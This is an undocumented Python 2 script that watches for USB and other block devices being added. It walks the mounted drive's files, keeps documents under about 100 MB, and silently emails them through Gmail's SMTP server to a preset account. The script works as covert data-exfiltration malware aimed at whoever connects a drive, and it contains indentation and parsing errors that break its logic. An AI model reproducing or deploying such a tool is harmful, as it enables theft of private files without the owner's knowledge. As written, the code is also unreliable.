import mimetypes
import os
import sys
import smtplib

import pyudev 
import os.path
import time
from time import strftime
from time import gmtime
from email import encoders
from email.message import Message
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

global  gmail_user,gmail_password

gmail_user = ""
gmail_password = "" 

def spider(directory):
	filelist = []
	for root,dirs,files in os.walk(directory):
		for name in files:
			filename = os.path.join(root,name)
		
			if os.stat(filename).st_size/1000000.0 < 100:#this is somewhat arbitrary 
				
				ctype, encoding = mimetypes.guess_type(filename)
				if ctype == None:
					continue
				maintype, subtype = ctype.split('/', 1)	
				if subtype == "x-msdownload" or subtype == "x-tar" or subtype == "zip" or maintype == "image" or maintype == "audio":
					continue
				else:
					
					filelist.append(filename)
					
	sendmail(directory,filelist)

def sendmail(directory,filelist):
	global  gmail_user,gmail_password

	outer = MIMEMultipart()
	time = strftime("%a, %d %b %Y %H:%M:%S", gmtime())
	outer['Subject'] = '%s %s' % (os.path.abspath(directory),time)
	outer['To'] = gmail_user
	outer['From'] = gmail_user
	
	for filename in filelist:
		print filename	
		ctype, encoding = mimetypes.guess_type(filename)
		if ctype is None or encoding is not None:
			ctype = 'application/octet-stream'

		maintype, subtype = ctype.split('/', 1)
		
		if maintype == 'text':
			fp = open(filename)
			msg = MIMEText(fp.read(), _subtype=subtype)
			fp.close()
	
		else:
			fp = open(filename, 'rb')
			msg = MIMEBase(maintype, subtype)
			msg.set_payload(fp.read())
			fp.close()
			encoders.encode_base64(msg)
		msg.add_header('Content-Disposition', 'attachment', filename=filename)
		outer.attach(msg)
	composed = outer.as_string()
	try:
		mail_server = smtplib.SMTP("smtp.gmail.com")
		mail_server.starttls()
		mail_server.login(gmail_user,gmail_password)
		mail_server.ehlo_or_helo_if_needed()
		mail_server.sendmail(gmail_user, gmail_user, composed)
		mail_server.quit()
		print "sent"
	except Exception as e:
		try:
			mail_server.quit()
			
		except:
			a = 0

		
			


context = pyudev.Context()
monitor = pyudev.Monitor.from_netlink(context)
monitor.filter_by('block')
for device in iter(monitor.poll,None):
	if device.action == "add": 
		
		for l in file('/proc/mounts'):
			if l[0]=='/':
				l = l.split()
		
		if(device.device_node in l): 
			continue
		
		else:
			time.sleep(15)
	
	elif device.action == "remove":
		continue
	
	for l in file('/proc/mounts'):
		if l[0]=='/':
			l = l.split()
	
	if(device.device_node in l): 
	try:
		spider(l[1])
	except:
		continue
		
		